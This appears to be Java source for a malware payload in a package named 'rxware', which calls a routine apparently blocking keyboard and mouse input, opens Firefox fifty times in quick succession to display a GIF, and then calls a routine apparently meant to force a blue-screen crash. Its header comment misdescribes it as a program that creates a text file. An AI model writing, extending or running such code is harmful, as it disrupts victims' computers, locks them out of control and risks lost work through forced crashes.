package rxware;

import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.concurrent.TimeUnit;

// Java program to create a text File using FileWriter
public class payload1{
    public static void main(String[] args){
        Path programPath = Paths.get("C:\\Program Files\\Mozilla Firefox\\firefox.exe");

        String gifPath = null;
        try {
            gifPath = payload1.class.getResource("rotary.gif").toURI().getPath();
        } catch (URISyntaxException e) {
            throw new RuntimeException(e);
        }

        try {
            InputBlockerPayload.main();
            for(int i = 0; i < 50; i++){
                Process mainProgram = new ProcessBuilder(programPath.toString(), gifPath).start();
                try {
                    TimeUnit.MILLISECONDS.sleep(500);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
            BSODPayload.main();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
